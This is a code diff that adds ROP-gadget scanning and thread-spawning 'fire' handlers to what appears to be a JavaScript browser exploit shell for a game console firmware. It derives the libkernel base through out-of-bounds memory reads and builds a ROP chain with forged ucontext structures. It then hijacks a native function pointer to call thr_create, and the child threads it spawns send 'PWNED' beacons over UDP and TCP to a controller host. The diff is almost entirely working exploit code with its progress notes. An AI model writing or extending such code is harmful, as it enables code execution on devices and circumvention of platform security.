@@ -8016,6 +8016,450 @@ function _startWsShell(){
         break;
       }
 
+      case 'gadget':{
+        /* THE GADGET CENSUS (fire-3): dump the vtable-neighborhood bytes
+         * (the X-proven readable+executable rodata class) and scan for
+         * the chain gadgets: 5F 5D C3 (pop rdi;pop rbp;ret), 5F C3
+         * (pop rdi;ret), 5E C3 (pop rsi;ret), 5A C3 (pop rdx;ret),
+         * 58 C3 (pop rax;ret), 48 89 C7 C3 (mov rdi,rax;ret),
+         * 48 97 C3 (xchg rax,rdi;ret). Both tables: OUR VP
+         * (BASE+0x724DB28) and ZigZagBoi1's FontFaceSet VP
+         * (BASE+0xC6A1B28 - the one with the device-confirmed pre-s0
+         * gadgets). The fire-2 preheader census proved our own VP-4
+         * is ZERO BYTES - the borrowed gadget offsets were wrong and
+         * both fire-1/fire-2 chains faulted at rung 1. */
+        if(!S.BASE){reply.err='no BASE';break;}
+        function GD(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('GADGET-'+s),true);x.send();}catch(e){}}
+        try{
+          var v1=S.BASE+0x724DB28n, v2=S.BASE+0xC6A1B28n;
+          var pats={'5F5DC3':'pop rdi;pop rbp;ret','5FC3':'pop rdi;ret','5EC3':'pop rsi;ret','5AC3':'pop rdx;ret','58C3':'pop rax;ret','4889C7C3':'mov rdi,rax;ret','4897C3':'xchg rax,rdi;ret'};
+          /* NEVER read BELOW a vtable start (fire-3/4 census crashes:
+           * below VP AND above FSET both faulted). Scan ONLY our own
+           * proven-readable band, strictly ABOVE the address point:
+           * [VP, VP+0x120000) is the session-226-dumped class. */
+          var regions=[[v1,v1+0x4000n,'VP']];
+          var hits=[];
+          var chunkDone=0;
+          for(var gi3=0;gi3<regions.length;gi3++){
+            var lo=regions[gi3][0],hi=regions[gi3][1],tag=regions[gi3][2];
+            for(var a=lo;a<hi;a+=0x100n){
+              GD('chunk '+tag+' 0x'+a.toString(16)+' hits='+hits.length);
+              var chunk=S.absRead(a,0x100);
+              var bytes=[];
+              for(var q=0;q<chunk.length;q++){
+                var hx=chunk[q].toString(16).padStart(16,'0');
+                for(var p=14;p>=0;p-=2)bytes.push(parseInt(hx.substr(p,2),16));
+              }
+              for(var b=0;b<bytes.length-2;b++){
+                var seq=bytes[b].toString(16).padStart(2,'0')+(bytes[b+1]||0).toString(16).padStart(2,'0');
+                var seq3=seq+(bytes[b+2]||0).toString(16).padStart(2,'0');
+                var seq4=seq3+(bytes[b+3]||0).toString(16).padStart(2,'0');
+                if(pats[seq3]){hits.push({g:pats[seq3],at:'0x'+(a+BigInt(b)).toString(16),tag:tag});}
+                else if(pats[seq]){hits.push({g:pats[seq],at:'0x'+(a+BigInt(b)).toString(16),tag:tag});}
+                var seqm='48'+bytes[b].toString(16).padStart(2,'0')+'C7C3';
+                if(bytes[b]===0x89&&bytes[b+1]===0xC7&&bytes[b+2]===0xC3){hits.push({g:'mov rdi,rax;ret',at:'0x'+(a+BigInt(b-1)).toString(16),tag:tag});}
+                if(bytes[b]===0x97&&bytes[b+1]===0xC3&&bytes[b-1]===0x48){hits.push({g:'xchg rax,rdi;ret',at:'0x'+(a+BigInt(b-1)).toString(16),tag:tag});}
+              }
+            }
+          }
+          /* pick the chain gadget: prefer pop rdi;pop rbp;ret, then pop rdi;ret */
+          var pick=0n;
+          for(var h2=0;h2<hits.length;h2++){if(hits[h2].g==='pop rdi;pop rbp;ret'){pick=BigInt(hits[h2].at);break;}}
+          if(pick===0n){for(var h3=0;h3<hits.length;h3++){if(hits[h3].g==='pop rdi;ret'){pick=BigInt(hits[h3].at);break;}}}
+          if(pick===0n&&hits.length){pick=BigInt(hits[0].at);}
+          S.popRdiGadget=pick;
+          reply.hits=hits.slice(0,60);
+          reply.pick=pick!==0n?('0x'+pick.toString(16)):'none';
+          GD('census hits='+hits.length+' pick='+(pick!==0n?'0x'+pick.toString(16):'none'));
+        }catch(eG){reply.err='gadget fault: '+String(eG&&eG.message?eG.message:'?');}
+        break;
+      }
+
+      case 'fire30':{
+        /* THE CORRECTED DIRECT THR_CREATE FIRE (session 229; the game lane
+         * is blocked - this is the in-house route).
+         *
+         * THE NEVER-RUN EXPERIMENT: every prior direct fire targeted
+         * lk+0x13ED0, which session 195 proved is SIGRETURN - invalid as
+         * thr_create tests. This fires the Rosetta-verified
+         *   THR_CREATE = lk+0x13D20  (Thrd_create 0x4BDE0 -> thunk 0x358
+         *                              -> GOT 0x1179F0)
+         * with the 156c gated ucontext AT RDI=fakeScope (the rawcall ABI;
+         * the srop27-36 installs prove gate/GPR writes into the scope
+         * survive the trampoline pre-call).
+         *
+         * THE RAWCALL ABI, ACCEPTED: RSI=cfr is trampoline-fixed (the JSC
+         * native ABI CallFrame* register) - the kernel writes the new tid
+         * at *RSI = [cfr] = the CallFrame callee slot -> the parent LIKELY
+         * dies post-call. ACCEPTED BY DESIGN: the child ladder below is
+         * the witness, not the parent. RDX = the stale executable pointer
+         * (flags) - if Sony validates flags==0 the call EINVAL-declines
+         * and the parent survives (this fire measures that too).
+         *
+         * THE CHILD LADDER (survives parent death):
+         *   childR  = the ctx at the scope: RIP=thr_create(lk+0x13D20),
+         *             RDI=CTX_S, RSI=WIT, RDX=0, RSP=chainR. Its first act
+         *             spawns childS, then its ret walks chainR.
+         *   childS  = CTX_S in the scratch: socket(2,2,0) via the r10
+         *             trampoline lk+0x3B7 (mov r10,rcx; syscall; ret,
+         *             RAX=97 from the ctx) -> a UDP fd appears in the
+         *             process table -> ret -> [RSP]=EXIT_SLOT=thr_exit.
+         *   chainR  = rungs of [POP_RDI_RBP_RET (VP-4, device-confirmed),
+         *             CTX_Gn, 0, thr_create] - RSI=WIT and RDX=0 persist
+         *             across the stubs (mov rax,N; syscall; ret never
+         *             touches them) -> every rung spawns a guess child.
+         *   childGn = CTX_Gn: sendto(fd=n, MSG, 32, 0, dest, 16) via
+         *             lk+0x3B7 (RAX=133, R8=&dest, R9=16 from the ctx)
+         *             -> ret -> EXIT_SLOT=thr_exit(lk+0x13EC0).
+         *             Wrong fd = EBADF decline, harmless. The rung whose
+         *             fd matches childS's socket lands
+         *             "FIRE30-PWNED..." at PC:31337/udp -> host.py logs
+         *             it in udp-beacons.log = *** THE SPAWN PROVEN + A
+         *             6-ARG SYSCALL EXECUTED = ARGUMENT POWER ***, even
+         *             with the parent dead.
+         *
+         * THE SCOPE PROTOCOL: zero ONLY +0x00..0x20 (the stale JSValue
+         * heads) - NEVER +0x38/+0x40 (the VM pair; the tws had this V82
+         * bug built in and was never fired). Gates: the 156c/80a map -
+         * magic@+0x108=0x480 AND mc_len@+0x118=0x480 (the 80a gate the
+         * tws was missing: without it = kernel panic class), type@+0x110
+         * =0x10000 (the no-FP path), CS at BOTH +0xC0 and +0xE8, the
+         * 814a FP constants filled (the srop35 lesson: no sparse xsave).
+         * The childR ctx IS the scope (RDI=fakeScope is forced). */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function F3(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('F30-'+s),false);x.send();}catch(e){}}
+        function F3a(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('F30-'+s),true);x.send();}catch(e){}}
+        try{
+          /* ---- 1. THE LK DERIVATION (the proven pthread backlink) ---- */
+          var entF=S.absRead(0x10001c8000n,0x100),trF=0n;
+          for(var eF=0;eF<entF.length;eF++){if(entF[eF]>=0x10001f0000n&&entF[eF]<0x1000200000n){trF=entF[eF];break;}}
+          if(trF===0n){reply.err='no thread-record ptr';break;}
+          var trrF=S.absRead(trF,0x60),ptF=0n;
+          for(var tF=0;tF<trrF.length;tF++){if(trrF[tF]>=0x880000000n&&trrF[tF]<0x900000000n){ptF=trrF[tF];break;}}
+          if(ptF===0n){reply.err='no pthread ptr';break;}
+          var ndF=ptF,qF=0n;
+          for(var hF=0;hF<5;hF++){
+            var ppF=S.absRead(ndF,0x60);qF=ppF[8];
+            if((qF&0x3fffn)===0x218n&&qF>0x800000000n)break;
+            ndF=qF-0x38n;
+          }
+          if((qF&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var lkF=qF-0x6C218n;
+          if(lkF%0x4000n!==0n){reply.err='lk base unaligned';break;}
+          var canF=S.absRead(lkF+0x751D0n,8)[0];
+          if(!(canF>0x1000000n)){reply.err='canary fail';break;}
+          reply.lk='0x'+lkF.toString(16);
+          F3('1 lk=0x'+lkF.toString(16)+' canary ok');
+
+          /* ---- 2. THE TARGETS + THE GADGETS ---- */
+          var THR_CREATE=lkF+0x13D20n, THR_EXIT=lkF+0x13EC0n, R10TRAMP=lkF+0x3B7n;
+          var VPF=S.BASE+0x724DB28n;
+          /* THE CHAIN GADGET: msg.gadget (absolute hex) overrides; else
+           * the `gadget` command's census pick (S.popRdiGadget); else
+           * FSET-4 (BASE+0xC6A1B28-4) - ZigZagBoi1's DEVICE-CONFIRMED
+           * pop rdi;pop rbp;ret in the FontFaceSet vtable's preheader,
+           * the table whose [-0x10,0) preheader the shell reads EVERY
+           * session (the -32/0 identity check) - readable-proven and
+           * RIP-call-proven on 14.10. (The old VP-4 default was WRONG:
+           * fire-2 proved OUR VP's preheader is zeros.) */
+          var POP_RDI_RBP_RET=0n;
+          if(msg.gadget){POP_RDI_RBP_RET=BigInt(msg.gadget);}
+          else if(S.popRdiGadget){POP_RDI_RBP_RET=S.popRdiGadget;}
+          else {POP_RDI_RBP_RET=VPF+0x5454000n-4n;}  /* FSET-4 = BASE+0xC6A1B28-4 */
+          reply.gadget='0x'+POP_RDI_RBP_RET.toString(16);
+          /* THE PREHEADER BYTES [VP-0x10, VP): the s0-N gadget zone
+           * (ret@-1, pop rbp@-2, pop rdi;pop rbp;ret@-4, the UNNAMED
+           * s0-7). Read + beacon + scan for pop rax (58 C3) / pop rsi
+           * (5E C3) / pop rdx (5A C3) - banked for the chain design. */
+          var preF=S.absRead(VPF-0x10n,0x10);
+          var preHex=preF.map(function(w){return w.toString(16).padStart(16,'0');}).join('');
+          var preBytes=[];
+          for(var pb=0;pb<2;pb++){var hxF=preHex.substr(pb*16,16);for(var pb2=14;pb2>=0;pb2-=2)preBytes.push(parseInt(hxF.substr(pb2,2),16));}
+          var gRax=-1,gRsi=-1,gRdx=-1;
+          for(var pb3=0;pb3<preBytes.length-1;pb3++){
+            if(preBytes[pb3]===0x58&&preBytes[pb3+1]===0xC3)gRax=pb3;
+            if(preBytes[pb3]===0x5E&&preBytes[pb3+1]===0xC3)gRsi=pb3;
+            if(preBytes[pb3]===0x5A&&preBytes[pb3+1]===0xC3)gRdx=pb3;
+          }
+          reply.preheader=preHex;
+          reply.preGadgets={pop_rax:gRax,pop_rsi:gRsi,pop_rdx:gRdx};
+          F3('2 VP=0x'+VPF.toString(16)+' gadget=0x'+POP_RDI_RBP_RET.toString(16)+' pre='+preHex+' prax='+gRax+' prsi='+gRsi+' prdx='+gRdx);
+          reply.targets={thr_create:'lk+0x13D20',thr_exit:'lk+0x13EC0',r10tramp:'lk+0x3B7',pop_rdi_rbp_ret:'VP-4'};
+
+          /* ---- 3. THE SCRATCH: a fresh 32KB ArrayBuffer, found by a
+           * 3-qword marker scan of the OOB view (the certified-flow
+           * method; [view,view+4MB) proven every boot). ---- */
+          var M1=0xF17E30CA11BEAC01n,M2=0x0BADC0DE515EED15n,M3=0x0FF1CE30BADC0DE5n;
+          var LAD=new ArrayBuffer(0x8000);
+          var ldv=new DataView(LAD);
+          ldv.setBigUint64(0x00,M1,true);ldv.setBigUint64(0x08,M2,true);ldv.setBigUint64(0x10,M3,true);
+          /* MSG @+0x20 (32 bytes): "FIRE30-PWNED-14.10-SPAWN-OK<>" */
+          var msgTxt='FIRE30-PWNED-14.10-SPAWN-OK';
+          for(var mi=0;mi<32;mi++)ldv.setUint8(0x20+mi,mi<msgTxt.length?msgTxt.charCodeAt(mi):0x2E);
+          /* dest sockaddr_in @+0x40: family=2, port=htons(31337)=0x7A69,
+           * addr=htonl(10.100.102.2)=0x0A646602 (network byte order in
+           * the struct; the bytes below are the wire layout). */
+          ldv.setUint8(0x40,0x02);ldv.setUint8(0x41,0x00);
+          ldv.setUint8(0x42,0x7A);ldv.setUint8(0x43,0x69);
+          ldv.setUint8(0x44,0x0A);ldv.setUint8(0x45,0x64);
+          ldv.setUint8(0x46,0x66);ldv.setUint8(0x47,0x02);
+          for(var zi=0x48;zi<0x50;zi++)ldv.setUint8(zi,0);
+          var oN=(typeof S.viewSize==='bigint')?Number(S.viewSize):S.viewSize;
+          var scanTop=Math.min(oN-24,0x800000);
+          var LAD_BASE=0n;
+          for(var off=0;off<scanTop;off+=8){
+            if(S.oobDV.getBigUint64(off,true)===M1&&S.oobDV.getBigUint64(off+8,true)===M2&&S.oobDV.getBigUint64(off+16,true)===M3){LAD_BASE=S.viewBase+BigInt(off);break;}
+          }
+          if(LAD_BASE===0n){reply.err='scratch not found in the OOB view (marker miss)';break;}
+          reply.scratch='0x'+LAD_BASE.toString(16);
+          F3('3 scratch=0x'+LAD_BASE.toString(16)+' (marker-found, 0x8000)');
+
+          /* ---- 4. THE LADDER LAYOUT IN THE SCRATCH ----
+           * TWO WAVES (v2, after the first fire's clean death):
+           * WAVE 1 - THE INSTANT TCP WITNESS: sendto(fd_guess, MSG, 32,
+           *   0, NULL, 0) on the page's OWN POOLED TLS CONNECTION to
+           *   :8443 (it exists BEFORE the fire - the XHR poll channel;
+           *   zero creation, zero ladder dependencies, fires within
+           *   microseconds of the spawn, unbeatable by the teardown).
+           *   Raw non-TLS bytes into the live session -> the server's
+           *   tlsClientError hook logs TLS-DECODE-ERROR = THE SPAWN
+           *   WITNESS even if the process dies a microsecond later.
+           *   Guess fds 3..12 (R8=R9=0: sendto on a connected socket
+           *   acts as send; wrong fds = ENOTSOCK/EBADF, harmless).
+           * WAVE 2 - THE CLEAN UDP WITNESS (needs the process to live):
+           *   childS creates a UDP socket, then fd-guess children
+           *   sendto MSG to PC:31337 (R8=&dest, R9=16) - a real
+           *   out-of-band packet with our marker string.
+           * chainR: [POP_RDI_RBP_RET, CTX, 0, thr_create] per child
+           * (RSI=WIT + RDX=0 persist across every stub), then exit. */
+          var A_MSG=LAD_BASE+0x20n, A_DEST=LAD_BASE+0x40n, A_WIT=LAD_BASE+0x60n,
+              A_EXIT=LAD_BASE+0x68n, A_CTXS=LAD_BASE+0x100n, A_CHAIN=LAD_BASE+0x300n,
+              A_CTXG=LAD_BASE+0x700n;
+          var FD_LO=parseInt(msg.lo)||3, FD_HI=parseInt(msg.hi)||20;
+          var NG=FD_HI-FD_LO+1;
+          var TF_LO=parseInt(msg.tlo)||3, TF_HI=parseInt(msg.thi)||12;
+          var TNG=TF_HI-TF_LO+1;
+          if(NG<1||NG>40||TNG<1||TNG>16){reply.err='bad fd range';break;}
+          if((TNG+1+NG+1)*4>128){reply.err='chain overflow';break;}
+          /* THE 814a FP CONSTANTS (srop35): a fully-formed xsave area in
+           * every ctx - no sparse gaps (the #GP class). */
+          var KFP={0x140:0x20037Fn,0x158:0x2FFFF00009FE5n,0x168:0xFFFFn,
+                  0x178:0xFFFFn,0x188:0xFFFFn,0x198:0xFFFFn,0x1A8:0xFFFFn,
+                  0x1D0:0x8180000000000000n,0x1D8:0x4007n,
+                  0x230:0x3FF0000000000000n,0x270:0xFFFFFFFFFFFFFFFFn,0x278:0xFFFFFFFFFFFFFFFFn};
+          function buildCtx(base,g,live){ /* g: the child's entry GPRs + gates.
+           * live=true for THE SCOPE ONLY: NO bulk zeroing (the srop12-25
+           * lesson: bulk writes to the live scope kill the call) - write
+           * ONLY the GPR slots + the gates; the scope's other live fields
+           * stay as the preflight left them. Scratch ctxs zero everything. */
+            if(!live){for(var z=0;z<0x120/8;z++)S.absWrite(base+BigInt(z*8),0n);}
+            S.absWrite(base+0x048n,g.rdi);S.absWrite(base+0x050n,g.rsi);
+            S.absWrite(base+0x058n,g.rdx);S.absWrite(base+0x060n,g.rcx||0n);
+            S.absWrite(base+0x068n,g.r8||0n);S.absWrite(base+0x070n,g.r9||0n);
+            S.absWrite(base+0x078n,g.rax||0n);
+            S.absWrite(base+0x0C0n,0x43n);       /* CS (156c print offset) */
+            S.absWrite(base+0x0D0n,0n);         /* uc_flags <= 7 */
+            S.absWrite(base+0x0E0n,g.rip);
+            S.absWrite(base+0x0E8n,0x43n);      /* CS (FreeBSD-consecutive) */
+            S.absWrite(base+0x0F0n,0x202n);     /* RFLAGS */
+            S.absWrite(base+0x0F8n,g.rsp);
+            S.absWrite(base+0x100n,0x3Bn);      /* SS */
+            S.absWrite(base+0x108n,0x480n);     /* magic */
+            S.absWrite(base+0x110n,0x10000n);   /* type (the no-FP path) */
+            S.absWrite(base+0x118n,0x480n);     /* mc_len - THE 80a GATE */
+            for(var f=0x140;f<0x280;f+=8)S.absWrite(base+BigInt(f),(KFP[f]!==undefined)?KFP[f]:0n);
+          }
+          /* EXIT_SLOT: every spawned child's ret lands here -> thr_exit */
+          S.absWrite(A_EXIT,THR_EXIT);
+          S.absWrite(A_WIT,0n);
+          /* childR (the parent's direct spawn, ctx AT THE SCOPE) IS THE
+           * FIRST WAVE-1 WITNESS ITSELF: its first instruction is
+           * sendto(TF_LO, MSG, 32, 0, NULL, 0) - ONE hop from the spawn,
+           * microseconds, unbeatable by the teardown race. Then its ret
+           * walks chainR which spawns: the remaining TCP fd guesses,
+           * childS (the wave-2 socket creator), the UDP fd guesses.
+           * The chain rungs' thr_create inherits RSI=A_MSG (writable -
+           * the tid lands harmlessly in the MSG buffer) and RDX=32 (the
+           * flags gamble: the first fire passed RDX=stale-huge-pointer,
+           * so strict flags validation is already unlikely). */
+          var ctxAddr=[],ci=0;
+          for(var ti=1;ti<TNG;ti++){ /* TF_LO+0 = childR's own fd guess */
+            var caT=A_CTXG+BigInt(ci++)*0x120n;
+            ctxAddr.push(caT);
+            buildCtx(caT,{rdi:BigInt(TF_LO+ti),rsi:A_MSG,rdx:32n,rcx:0n,r8:0n,r9:0n,rax:133n,rip:R10TRAMP,rsp:A_EXIT});
+          }
+          buildCtx(A_CTXS,{rdi:2n,rsi:2n,rdx:0n,rax:97n,rip:R10TRAMP,rsp:A_EXIT});
+          ctxAddr.push(A_CTXS);   /* childS: the wave-2 UDP socket creator */
+          for(var gi=0;gi<NG;gi++){
+            var ca=A_CTXG+BigInt(ci++)*0x120n;
+            ctxAddr.push(ca);
+            buildCtx(ca,{rdi:BigInt(FD_LO+gi),rsi:A_MSG,rdx:32n,rcx:0n,r8:A_DEST,r9:16n,rax:133n,rip:R10TRAMP,rsp:A_EXIT});
+          }
+          if(A_CTXG+BigInt(ci)*0x120n>LAD_BASE+0x8000n){reply.err='ctx overflow';break;}
+          /* chainR: [POP_RDI_RBP_RET, CTX, 0, thr_create] per child, then
+           * [POP_RDI_RBP_RET, 0, 0, thr_exit]. */
+          var ch=A_CHAIN,qw=0;
+          for(var rj=0;rj<ctxAddr.length;rj++){
+            S.absWrite(ch+BigInt((qw++)*8),POP_RDI_RBP_RET);
+            S.absWrite(ch+BigInt((qw++)*8),ctxAddr[rj]);
+            S.absWrite(ch+BigInt((qw++)*8),0n);
+            S.absWrite(ch+BigInt((qw++)*8),THR_CREATE);
+          }
+          S.absWrite(ch+BigInt((qw++)*8),POP_RDI_RBP_RET);
+          S.absWrite(ch+BigInt((qw++)*8),0n);
+          S.absWrite(ch+BigInt((qw++)*8),0n);
+          S.absWrite(ch+BigInt((qw++)*8),THR_EXIT);
+          reply.ladder={tcpWave:[TF_LO,TF_HI],udpWave:[FD_LO,FD_HI],chainChildren:ctxAddr.length,firstWitness:'childR sendto fd '+TF_LO,chainQwords:qw,wit:'0x'+A_WIT.toString(16)};
+          F3('4 ladder built: childR=w1-fd'+TF_LO+' then '+(ctxAddr.length)+' chain children (w1-tcp='+(TNG-1)+' childS w2-udp='+NG+') qwords='+qw);
+
+          /* ---- 5. THE PARENT CTX = THE SCOPE (RDI is forced there).
+           * Zero ONLY the +0x00..0x20 JSValue heads; the VM pair at
+           * +0x38/+0x40 is NEVER touched (the V82 lesson). THE CHILD'S
+           * ENTRY REGISTERS = childR = THE FIRST TCP WITNESS:
+           * RIP=r10-tramp, RAX=133(sendto), RDI=TF_LO (the fd guess),
+           * RSI=&MSG, RDX=32, R8=R9=0 (NULL dest = send on the pooled
+           * TLS socket), RSP=chainR (the rest of the ladder). ---- */
+          for(var zc=0;zc<4;zc++)S.absWrite(S.fakeScope+BigInt(zc*8),0n);
+          var scG={rdi:BigInt(TF_LO),rsi:A_MSG,rdx:32n,rcx:0n,r8:0n,r9:0n,rax:133n,rip:R10TRAMP,rsp:A_CHAIN};
+          buildCtx(S.fakeScope,scG,true);
+          F3('5 scope ctx armed: childR=sendto(fd '+TF_LO+',MSG) RIP=lk+0x3B7 RSP=chain gates on');
+
+          /* ---- 6. THE FIRE ---- */
+          reply.fired=true;
+          F3('CALL lk+0x13D20 RDI=scope(ctx) RSI=cfr(tid out) RDX=stale');
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var origF=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,THR_CREATE);
+          try{Math.round(-5.7);}catch(eF2){}
+          S.absWrite(S.neEntry.addr+0x28n,origF);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+          F3a('6 POST-CALL ALIVE');
+
+          /* ---- 7. THE IN-BAND WITNESS (only if the parent survived) ---- */
+          var tidF=S.absRead(A_WIT,8)[0];
+          reply.wit='0x'+tidF.toString(16);
+          reply.tidChanged=(tidF!==0n&&tidF<0x100000n);
+          reply.verified=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origF);
+          reply.note='UDP beacon at 31337 = the spawn proof (parent death tolerated by design)';
+        }catch(eF3){reply.err='fire30 fault: '+String(eF3&&eF3.message?eF3.message:'?');}
+        break;
+      }
+
+      case 'fire31':{
+        /* THE MINIMAL SPAWN PROOF (fire-5): the simplest discriminating
+         * thr_create fire. Child ctx: RIP=thr_exit(lk+0x13EC0) - the
+         * child calls thr_exit(0) AT BIRTH and is gone in microseconds.
+         * No chain, no gadgets, no fds, no races: every death-theory
+         * collapses to the call itself.
+         * VERDICTS: parent SURVIVES + [cfr] changed to a small int =
+         *   *** THE SPAWN PROVEN *** (the kernel wrote the tid there;
+         *   the frame tolerated it - the post-call completed). parent
+         * SURVIVES + [cfr] unchanged = the decline class (read the
+         * errno path). parent DIES = the tid-at-cfr kill theory or an
+         * in-kernel fault - bisect further with the zero-ctx control. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function F31(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('F31-'+s),false);x.send();}catch(e){}}
+        try{
+          /* the lk derivation */
+          var entF31=S.absRead(0x10001c8000n,0x100),trF31=0n;
+          for(var e31=0;e31<entF31.length;e31++){if(entF31[e31]>=0x10001f0000n&&entF31[e31]<0x1000200000n){trF31=entF31[e31];break;}}
+          if(trF31===0n){reply.err='no thread-record ptr';break;}
+          var trrF31=S.absRead(trF31,0x60),ptF31=0n;
+          for(var t31=0;t31<trrF31.length;t31++){if(trrF31[t31]>=0x880000000n&&trrF31[t31]<0x900000000n){ptF31=trrF31[t31];break;}}
+          if(ptF31===0n){reply.err='no pthread ptr';break;}
+          var ndF31=ptF31,qF31=0n;
+          for(var h31=0;h31<5;h31++){
+            var ppF31=S.absRead(ndF31,0x60);qF31=ppF31[8];
+            if((qF31&0x3fffn)===0x218n&&qF31>0x800000000n)break;
+            ndF31=qF31-0x38n;
+          }
+          if((qF31&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var lkF31=qF31-0x6C218n;
+          var canF31=S.absRead(lkF31+0x751D0n,8)[0];
+          if(!(canF31>0x1000000n)){reply.err='canary fail';break;}
+          F31('1 lk=0x'+lkF31.toString(16)+' canary ok');
+          reply.lk='0x'+lkF31.toString(16);
+          var THR_CREATE31=lkF31+0x13D20n, THR_EXIT31=lkF31+0x13EC0n;
+          /* the minimal child ctx AT THE SCOPE. THE SROP27 DISCIPLINE:
+           * NO bulk zeroing of the live scope (the srop12-25 deaths) -
+           * write ONLY the needed GPR slot + the gates. The live scope's
+           * other fields stay as the preflight left them. */
+          for(var z31=0;z31<4;z31++)S.absWrite(S.fakeScope+BigInt(z31*8),0n);
+          S.absWrite(S.fakeScope+0x048n,0n);            /* child RDI = 0 */
+          S.absWrite(S.fakeScope+0x0C0n,0x43n);
+          S.absWrite(S.fakeScope+0x0D0n,0n);
+          S.absWrite(S.fakeScope+0x0E0n,THR_EXIT31);    /* child RIP = thr_exit */
+          S.absWrite(S.fakeScope+0x0E8n,0x43n);
+          S.absWrite(S.fakeScope+0x0F0n,0x202n);
+          S.absWrite(S.fakeScope+0x0F8n,S.fakeScope+0x800n); /* a valid cage RSP */
+          S.absWrite(S.fakeScope+0x100n,0x3Bn);
+          S.absWrite(S.fakeScope+0x108n,0x480n);
+          S.absWrite(S.fakeScope+0x110n,0x10000n);
+          S.absWrite(S.fakeScope+0x118n,0x480n);
+          var cfr31=S.cfr, cfrSave=S.absRead(cfr31,8)[0];
+          /* the pre-call window snapshot: the tid lands at the CURRENT
+           * call frame's RSI (the trampoline's live cfr, deeper than the
+           * session-recorded S.cfr) - a pre/post DIFF over [cfr-0x800,
+           * cfr+0x40) catches it wherever it lands */
+          var winLo31=cfr31-0x800n, preWin=S.absRead(winLo31,0x840);
+          /* THE CONTROL MODES: gd = the PURE E2 gettimeofday call with
+           * ZERO ctx writes (the true mechanics baseline); badmagic =
+           * the full ctx fire with an invalid magic (a real thr_create
+           * EINVAL-declines -> survives: proves RVA/gate semantics) */
+          var mode31=msg.mode||'';
+          var target31=lkF31+0x13D20n;
+          var armed31=true;
+          if(mode31==='gd'){target31=lkF31+0xB50n;armed31=false;}
+          if(mode31==='ret'){target31=S.BASE+0x4001750n;armed31=false;} /* the ICF no-op: an external target that writes nothing */
+          if(mode31==='self'){target31=0n;armed31=false;}
+          if(armed31){
+            /* the minimal child ctx AT THE SCOPE. THE SROP27 DISCIPLINE:
+             * NO bulk zeroing of the live scope - ONLY the needed GPR
+             * slot + the gates. NOTE: +0xC0 is NOT written (the ic-mode
+             * survivors never touched it; only the +0xE8-class CS gate
+             * has kernel-disassembly backing). */
+            for(var z31=0;z31<4;z31++)S.absWrite(S.fakeScope+BigInt(z31*8),0n);
+            S.absWrite(S.fakeScope+0x048n,0n);            /* child RDI = 0 */
+            S.absWrite(S.fakeScope+0x0D0n,0n);
+            S.absWrite(S.fakeScope+0x0E0n,THR_EXIT31);    /* child RIP = thr_exit */
+            S.absWrite(S.fakeScope+0x0E8n,0x43n);
+            S.absWrite(S.fakeScope+0x0F0n,0x202n);
+            S.absWrite(S.fakeScope+0x0F8n,S.fakeScope+0x800n); /* a valid cage RSP */
+            S.absWrite(S.fakeScope+0x100n,0x3Bn);
+            S.absWrite(S.fakeScope+0x108n,0x480n);
+            S.absWrite(S.fakeScope+0x110n,0x10000n);
+            S.absWrite(S.fakeScope+0x118n,0x480n);
+            if(mode31==='badmagic'){S.absWrite(S.fakeScope+0x108n,0x1n);}
+          }
+          F31('2 ctx armed='+(armed31?'RIP=thr_exit(c0) gates':'NONE (gd baseline)')+' cfr=0x'+cfr31.toString(16)+' save=0x'+cfrSave.toString(16)+' mode='+mode31);
+          F31('3 CALL target='+(mode31==='self'?'SELF(no-op)':('lk+0x'+(target31-lkF31).toString(16))));
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var orig31=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          if(mode31==='self'){target31=orig31;}  /* same-value redirect: a pure machinery control */
+          S.absWrite(S.neEntry.addr+0x28n,target31);
+          var t0=Date.now();
+          try{Math.round(-5.7);}catch(e31b){}
+          S.absWrite(S.neEntry.addr+0x28n,orig31);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+          /* survived: diff the window to find the tid write */
+          var cfrNow=S.absRead(cfr31,8)[0];
+          var postWin=S.absRead(winLo31,0x840);
+          var tidVal=0n,tidOff=-1;
+          for(var d31=0;d31<preWin.length;d31++){
+            if(preWin[d31]!==postWin[d31]){
+              tidVal=postWin[d31];tidOff=d31;
+              F31('TID-WRITE at 0x'+(winLo31+BigInt(d31*8)).toString(16)+' (cfr'+(d31*8-0x800>=0?'+':'')+(d31*8-0x800)+'): 0x'+preWin[d31].toString(16)+' -> 0x'+tidVal.toString(16));
+            }
+          }
+          F31('4 ALIVE cfr0=0x'+cfrSave.toString(16)+' cfrNow=0x'+cfrNow.toString(16)+' windowDiffs='+(tidOff>=0?'YES':'none'));
+          reply.cfr={was:'0x'+cfrSave.toString(16),now:'0x'+cfrNow.toString(16)};
+          reply.tid={val:'0x'+tidVal.toString(16),at:tidOff>=0?('0x'+(winLo31+BigInt(tidOff*8)).toString(16)):'none'};
+          reply.spawned=(tidOff>=0&&tidVal>0n&&tidVal<0x1000000n);
+          reply.verified=(S.absRead(S.neEntry.addr+0x28n,8)[0]===orig31);
+        }catch(eF31){reply.err='fire31 fault: '+String(eF31&&eF31.message?eF31.message:'?');}
+        break;
+      }
+
       case 'tw':{
         /* THE THREAD WITNESS (the game lane's 56l probe ported): the
          * thr_new candidate (export entry #msg.idx) called with a FULLY
